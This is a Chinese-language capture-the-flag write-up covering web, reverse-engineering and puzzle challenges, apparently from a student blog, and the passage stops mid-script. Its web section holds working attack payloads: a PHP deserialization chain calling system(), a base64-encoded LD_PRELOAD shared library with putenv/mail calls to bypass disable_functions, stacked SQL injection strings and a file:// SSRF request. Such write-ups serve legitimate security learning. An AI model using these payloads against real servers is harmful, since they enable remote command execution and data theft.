什么???X-Forwarded-For要改127.0.0.1???, 我没改怎么拿到flag了???于是看了看自己的firefox插件…屮…原来是之前做了题就没有关掉这个, 导致自己一直都是127.0.0.1…所以直接就出flag了…但是wp已经提交了啊! 也没办法改了, 说实话有点慌… lottery_revenge去年也有抽奖, 一样的页面, 不一样的味道…(伪随机数的攻击居然在web里面出现了… 因为去年做过, 所以上来直接就开抽了(burpsuite永远的神, 但是发现不断访问data.php都是同一个响应, 有点不太对劲.所以看了看响应发现了一段注释 啊…抽奖它, 它升级了.要求$_POST['admin_key']==$_SESSION['key'] session就是时间戳吧. 第一个想法是先取现在的时间戳加上一个常数然后不停访问. 但是怎样都访问不成功(事实上就算访问成功了也就抽了一次奖, 下一次还得重新构造新的时间戳… 其实这里卡了一段时间(我也不知道自己到底爆破了多久…, 发现怎样都不行后就去看了下$_SESSION变量有没有什么可以利用的特性或者漏洞. 还真就发现了一个特性:当用户第一次访问的时候,$_SESSION的所有变量都是为空的(就是说初始化为空嘛, 可以看一下源码, 给$_SESSION['key']赋值是在一次访问之后, 所以! 只需要不带Cookies以及带上空的admin_key访问data.php就可以开始抽奖啦.抽出结果还是很开心的, 但是结果还需要下一步… 离谱, 按着提示进去 一开始没懂这个页面要我干嘛, 看看注释有没有提示, 发现下面有个source=1dddd, ?source=1看源码 大概是说随机生成30个数, 对应一个表中的30个字母生成一个随机的字符串, 给出前11位猜整个字符串. 毕竟做了挺多伪随机数的题了, 看到mt_rand()就想起之前差点没把我整吐的MT-19937.(当种子设定每次随机出来的数都是一模一样是不是很神奇啊! N1CTF那道伪随机数还历历在目. 所以说, 理论上知道随机数前面的几位输出是可以逆推回种子的(有时候需要足够多的输出才能得到种子, 但具体逆的算法肯定不是这题的考点(考了我也逆不出来, python脚本倒是有一个… 所以去搜了一下有没有攻击mt_rand()的脚本. 真就有一个php_mt_seed, github上就有了. 但是做的时候这里踩了一个大坑, github上面的是低版本的脚本, 所以导致跑了一下午都没有跑出结果来. 直到晚上发现别人的blog用的明显不是一个版本的脚本! 才去找了找发现真有从未体验过的船新版本, 马上扔进虚拟机跑, 不到一分钟就出结果了. 拿着刚出来的种子生成字符串提交就行了 unserialize一直觉得反序列化真的很有意思, 就像推理一样一步一步的往下推出payload源码在这12345678910111213141516171819202122232425262728293031323334&lt;?phphighlight_file(__FILE__);class A{ public $data; public function __destruct() { $this-&gt;data-&gt;close(); }}class B{ public $cache; public function getit($key){ if (isset($this-&gt;cache[$key])){ return $this-&gt;cache[$key]; } } public function __call($method, $args) { return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil,$arggg; public function evallll(){ call_user_func($this-&gt;evil,$this-&gt;arggg); }}unserialize($_GET['sssssss']);首先call_user_func()可以执行php中的函数, 包括system(), assert()这些危险的函数 而源码里面只有在类C中的call_user_func()是可以自己给定执行的函数和所用的参数的, 变量$evil和函数evallll()也提示了危险函数就出现在类C中, 所以现在的目的就是想办法调用类C中的evallll() 反序列化的题基本离不开魔法函数, 找了一下, 这里的出现了__destruct()和__call($method, $args). 对于__destruct(), 当某个对象被销毁的时候如果存在这个方法就会调用它. 程序结束肯定会销毁呀. 而对于__call():当某个对象的一个不存在的方法被调用时, 如果call方法存在, 则会调用call方法, 第一个参数是所调用的那个不存在的方法名, 第二个参数是调用不存在的方法时的参数. 因为A中的__destruct()会调用$data-&gt;close(), 所以能靠这个从A进入B的__call. 再看看B中的call_user_func_array($this-&gt;getit($method), $args);其实就是call_user_func_array($this-&gt;cache[$key], $args); 做到这里我就卡住了, 因为$args并不可控, 所以一时半会想不到怎样通过B中的这个函数去进入C. 于是决定去看看call_user_func_array();的手册. 这才知道原来这个函数的第一个参数可以是一个数组,具体是这样:[对象,对象的方法], 这样就可以调用C中的evallll()了! 所以只需要有:123456789class C中:$evil = 'system()';$arggg = cmd; # 具体就是需要执行的指令class B中:$cache['close'] = [new C,'evallll']class A中:$data = new B这样就可以任意执行命令了. 至于构造payload, 利用php就能构造了.附上构造的代码:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass A{ public $data; public function make($ob) { $this-&gt;data = $ob; }}class B{ public $cache; public function make($ob2) { $this-&gt;cache = $ob2; } public function getit($key) { if (isset($this-&gt;cache[$key])) { return $this-&gt;cache[$key]; } } public function __call($method, $args) { return call_user_func_array($this-&gt;getit($method), $args); }}class C{ public $evil = 'system'; public $arggg = 'cat /flag'; public function evallll() { call_user_func($this-&gt;evil, $this-&gt;arggg); }}$a = new A;$b = new B;$b-&gt;make(['close' =&gt; [new C, 'evallll']]);$a-&gt;make($b);var_dump(serialize($a));得到的payload为:1?sssssss=O:1:\"A\":1:{s:4:\"data\";O:1:\"B\":1:{s:5:\"cache\";a:1:{s:5:\"close\";a:2:{i:0;O:1:\"C\":2:{s:4:\"evil\";s:6:\"system\";s:5:\"arggg\";s:9:\"cat /flag\";}i:1;s:7:\"evallll\";}}}} 又一个后门这题做的时候发生了件小趣事(当然不是指前二血的大佬在/tmp下面搞事情啦.也不是指上一个大佬做完了题连so文件都没有删啦.更不是指自己做完了还忘记把flag文件给清理掉. 看了下phpinfo(), 发现能执行命令的函数都被ban掉了. 利用scandir()函数搜索网站目录.发现有tmp文件夹, 尝试上传文件发现可行. 想了想是否存在绕过disable_functions的漏洞呢?翻了翻百度, 找到一个在Github上的利用LD_PRELOAD漏洞绕过disable_functions的项目.附上链接 具体原理是利用LD_PRELOAD的特点,它可以影响程序的运行时的链接，它允许在程序运行前优先加载用户定义的动态链接库, 这样就可以覆盖正常的函数库, 调用一些被ban的函数.(有理解的不对的大佬请务必告诉我!!! 所以根据github上面的README.MD一步一步的做就行了 1. 先上传一个bypass_disablefunc_x64.so由于so文件是二进制文件, 所以上传的时候考虑先base64编码, 传上去用php自带的函数解码,下面是当时做题的payload(可能会有点长hhh1c=var_dump(scandir('/var/tmp'));$a='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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA';var_dump(file_put_contents('/var/tmp/helloworld.so',base64_decode($a))); 2. 利用so文件绕过被ban的函数把so文件传上去后其实可以继续传项目里的那个php的, 不过还是想试试能不能直接在payload里面实现. 其实也不难, 先设置需要执行的命令/readflag &gt; /var/tmp/K1rit0, 再设置环境变量LD_PRELOAD的值为刚刚传上去的helloworld.so, 然后调用mail(). 这个时候就会再/tmp下生成一个K1rit0, 里面就是/readflag的结果了! 所以payload为:1c=var_dump(putenv(\"EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0\"));var_dump(putenv(\"LD_PRELOAD=/var/tmp/helloworld.so\"));var_dump(mail(' ',' ',' ',' '));var_dump(file_get_contents('/var/tmp/K1rit0')); babysql真的很baby, query语句直接给出来了.参考自己的另外一个坑就能做了某篇sql总结 当时想都没想直接堆叠注入了(以至于以为这题过滤都没有,其实select这些还是被过滤掉了的1';show databases;show tables # 直接爆出库名和表名了1';desc flag # 爆出字段名然后就发现特殊字符串enjoy_Sq1i11_qu3ryy 包裹ctf{}提交了 babyssrf白给白给 利用file://协议, 提示说的很清楚了就在/flag payload: ?url=file:///flag OSINTcheckin搜啊搜搜啊搜, 真的是搜出来的flag哦(按着提示搜就行了 REVERSE 因为本身就是为了拿分才做的RE, 所以wp就比较简短了(真不想写hhh 可以去看看Misaka大佬的wp 捉迷藏Ida打开文件, 随便翻了翻, 发现 根据语义手动拼回flag basic_hash我就只会F5! 还好主函数很简单, 就是要求做题人利用异或运算的特点A+B+B = A还原两个md5值,然后扔到某MD5爆破网站获得flag.把ida中的两个字符串的值手动输入到脚本中,跑脚本就完事了1234567891011121314151617v9 = [70, -121, -115, 4, -67, 52, 126, 42, 113, 114, 79, 91, -61, -63, 6, -14]v26 = [59, -87, 103, -122, -46, -112, 104, -30, -92, 113, 125, -85, -14, 41, -24, 31]mask = 0b11111111for i in range(len(v9)): if v9[i] &lt; 0: v9[i] = abs(v9[i] ^ mask) - 1for i in range(len(v26)): if v26[i] &lt; 0: v26[i] = abs(v26[i] ^ mask) - 1input1_md5 = ''.join([hex(i ^ 0x30)[2:].zfill(2) for i in v9])input2_md5 = ''.join([hex(i ^ 0x20)[2:].zfill(2) for i in v26])print(input1_md5)print(input2_md5)这样就拿到两个MD5了1276b7bd348d044e1a41427f6bf3f136c21b8947a6f2b048c284515d8bd209c83f扔进网站, 得到flag ByteCode因为爽哥说很简单, 所以我就来看看, 百度了一下ByteCode. 知道是就是一堆操作之后. 找到ByteCode和操作的对应表! 拿出纸笔! 点开计算机! 一点一点手动往回算…(手动算的感觉针不戳算完ascii码全部转成字符串就是flag了 Misc 说实话没想到Misc这么多题, 不过Misc做起来就感觉像猜谜一样, 也挺有趣的. 真·签到不亏是我最拿手的签到题.秒解flag 2333 Look_at_your_keyboard题目都说了看键盘咯.1ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji键盘上是怎样的就怎样的(所以做的时候觉得S是8, I是1的肯定不是我一个吧!结果是ctfisfun, 对着键盘看就能看出来了. Buddha也没啥好说的.新佛曰-&gt;base64-&gt;栅栏密码 Do you know Xp0int用记事本打开图片.用眼睛一行一行的看有没有flag搜索ctf{ 结果啥都没搜{ 就找到flag了. 似乎有个可以跑出文件中出现的字符串的脚本 close_basebase64解码发现是C语言源码 (输出不是hello,world, 差评!估计是base64隐写了, 毕竟每一行base64编码结尾都有等号, 肯定能藏很多东西2333所以base64隐写是啥?这里不写了…直接上脚本123456789101112131415161718192021222324252627282930def bin2text(Bin): Hex = hex(int(Bin, 2))[2:] if len(Hex) % 2: Hex = '0' + Hex return ''.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'res = ''with open('base.txt', 'r') as f: base = f.readlines()for i in range(len(base)): base[i] = base[i][::-1][1:5][::-1]for i in base: tmp = '' for j in i: if j != '=': o = bin(table.index(j))[2:] tmp += '0' * (6 - len(o)) + o tmp = tmp + '0' * (24 - len(res)) if '==' in i: res += tmp[8:12] elif '=' in i: res += tmp[16:18]flag = 'ctf{' + bin2text(res) + '}'print(flag)输出的就是flag了(具体原理真的到处都有的,找就完事了 PMGBA做的最过瘾的一题(但是被自己蠢到了 开局一张图, 文件全靠拆.说实话一开始拿到图感觉挺熟悉的, 就是记不起来这是什么…直到去百度PMGBA的意思才知道是宝可梦.这不就是我上学期练级刷的怪吗! 我也算是半年的宝可梦老玩家了(俊强才是宝可梦大师!马上跑去问俊强”上学期我刷等级刷的那个有26个形态的字母怪叫什么”‘未知图腾’ 马上去找图鉴, 对应图鉴得到字符串remember to examine the.一开始拿到这个我还以为就是想让我检查这张图片的意思(鬼知道这是flag的前半部分啊喂 扔binwalk跑了一下发现确实不止一张图片.由于被foremost坑过所以能手动分文件就手动分了. 用winhex打开图片, 对照这文件头文件尾, 分出了三张图(包括最开始的未知图腾 最开始注意到的其实是第三张图, 这是我第一个练到5v的宝可梦, 卡蒂狗!拖进Stegsolve分析没有什么结果后. 决定看看是不是LSB. 于是又把卡蒂狗扔进zsteg, 出来了一串字符串’pwd is 58growliness\\n’. 密码是58growliness? 不知道这个密码是个啥直到从第二张图里分出段base64, 解码后发现是个加密的压缩包. 密码就是58growliness 里面一个txt, 内容全是pi ka chu的组合1pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... 后面还有很多 猜测是某种加密, 但是却搜不到.但后面找到一篇大概讲的是用皮卡丘语编程的文章, 大概内容就是套用brainfuck的语法来编程. 所以来试试看是不是brainfuck. 根据字符出现的频率自己强行脑部回了对应表(dalao说github上有!123456789dit={ 'pi':'+', 'ka':'-', 'chu':']', 'pika':'[', 'pipi':'&gt;', 'pichu':'&lt;', 'pikachu':'.', } 还原回brainfuck代码后运行得到的结果为foo bar 事实上拼接前面的remember to examine the foo bar 就是flag了.但我却没有想到…(谁想的到啊所以一直卡着不知道flag是啥.直到周一马克思课想着随便试一下, 才提交成功…(correct出来的时候人都傻了..还是脑洞不够大吗 集齐五龙珠一大堆的文件, 名字全都是base64. 想看看全部解码会不会有什么线索.写了个脚本来解码123456789import osfrom base64 import b64decodebase = 'problem/'filenames = []for root, ds, fs in os.walk(base): 